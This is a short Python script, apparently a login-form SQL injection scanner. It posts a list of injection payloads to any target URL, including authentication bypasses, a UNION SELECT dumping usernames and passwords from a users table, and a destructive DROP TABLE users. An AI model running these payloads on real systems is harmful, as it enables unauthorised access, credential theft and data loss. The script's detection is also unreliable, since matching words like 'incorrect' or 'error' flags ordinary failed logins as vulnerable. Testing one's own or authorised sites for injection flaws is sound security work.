import requests
import time
from bs4 import BeautifulSoup

def get_csrf_token(target_url):
    """Fetch CSRF token from the login page if required"""
    response = requests.get(target_url)
    soup = BeautifulSoup(response.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})  # Adjust based on actual field
    return token["value"] if token else None

def sqlscanner(target_url, username_field="uname", password_field="pass"):
    """Detect SQL injection vulnerabilities in login forms"""
    
    payloads = [
        "' OR '1'='1' -- ",
        "' OR 'a'='a' -- ",
        "' OR 1=1 -- ",
        "' OR 1=1#",
        "' OR SLEEP(5)--",
        "' UNION SELECT null, null, null--",
        "' UNION SELECT username, password FROM users--",
        "' OR (SELECT COUNT(*) FROM users) > 0 --",
        "'; DROP TABLE users; --",
    ]

    vulnerable_payloads = []
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    csrf_token = get_csrf_token(target_url)  # Get CSRF token if required

    for payload in payloads:
        try:
            data = {username_field: "admin", password_field: payload}
            if csrf_token:
                data["csrf"] = csrf_token  # Add CSRF token if found

            start_time = time.time()
            response = requests.post(target_url, data=data, headers=headers)
            elapsed_time = time.time() - start_time

            # Detect SQLi based on different signs
            if (
                "error" in response.text.lower()
                or "sql" in response.text.lower()
                or "syntax" in response.text.lower()
                or "incorrect" in response.text.lower()
                or "Login successful" in response.text
                or elapsed_time > 4  # Time-based SQLi detection
            ):
                vulnerable_payloads.append(payload)

        except requests.RequestException as e:
            print(f"Request failed for payload: {payload}, Error: {e}")
            continue

    if not vulnerable_payloads:
        return 200, "Website appears safe!"
    else:
        return 202, {"vulnerable_payloads": vulnerable_payloads}

# Example Usage
# target_website = "http://testphp.vulnweb.com/userinfo.php"  # Correct endpoint
# status, result = sqlscanner(target_website)
# print(status, result)
